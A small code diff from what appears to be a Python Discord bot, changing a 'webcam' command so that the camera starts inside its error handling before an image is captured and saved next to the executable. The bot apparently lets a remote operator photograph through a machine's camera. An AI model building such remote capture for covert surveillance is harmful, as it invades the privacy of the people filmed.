@@ -16,9 +16,9 @@ async def webcam(ctx, action=None, camera_index=None):
         else: camera_index = 0
         try:
             camera = pygame.camera.Camera(camera_index)
+            camera.start()
         except: 
             return await ctx.send('Camera with index ' + str(camera_index) + ' was not found.')
-        camera.start()
         time.sleep(1)
         image = camera.get_image()
         pygame.image.save(image, f'{os.path.dirname(sys.executable)}\\webcam.png')
